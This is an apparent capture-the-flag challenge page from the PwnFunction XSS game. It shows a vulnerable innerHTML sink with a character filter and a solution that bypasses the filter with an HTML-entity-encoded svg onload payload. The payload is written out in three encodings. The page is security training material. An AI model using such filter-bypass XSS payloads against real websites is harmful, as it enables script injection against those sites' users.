---
title: "XSS Game - Ah That's Hawt | PwnFunction"
header: "Ah That's Hawt"
challengeUrl: "https://sandbox.pwnfunction.com/warmups/thats-hawt.html"
date: 2020-01-19T18:19:34+05:30
draft: false
type: warmup
difficulty: Easy
---

{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
{{</ rules >}}

{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;h2 id=&#x22;will&#x22;&#x3E;&#x3C;/h2&#x3E;
&#x3C;script&#x3E;
    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &#x22;Ah That&#x27;s Hawt&#x22;)
    smith = smith.replace(/[\(\&#x60;\)\\]/g, &#x27;&#x27;)
    will.innerHTML = smith
&#x3C;/script&#x3E;</code>{{< /code >}}

{{< solution >}}
<p>Here we have a clear sink <code>will.innerHTML</code>, but <code>alert(1337)</code> can't be
    called because the filter removes <code>()`</code> characters. But the filter forgets to
    consider that the values of the attribtues can be HTML entity encoded, hence we simply encode
    the payload. Additionally we URL encode the payload because it has some URL unsafe characters
    like <code>&</code>.</p>

<pre class="solution-code-block"><code class="language-markup">&#x3C;!-- URL Encoding + HTML Entity Encoding --&#x3E;
%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E

&#x3C;!-- HTML Entity Encoding --&#x3E;
&#x3C;svg onload=&#x22;&#x26;#x61;&#x26;#x6C;&#x26;#x65;&#x26;#x72;&#x26;#x74;&#x26;#x28;&#x26;#x31;&#x26;#x33;&#x26;#x33;&#x26;#x37;&#x26;#x29;&#x22;&#x3E;

&#x3C;!-- No Encoding --&#x3E;
&#x3C;svg onload=&#x22;alert(1337)&#x22;&#x3E;
</code></pre>
{{< /solution >}}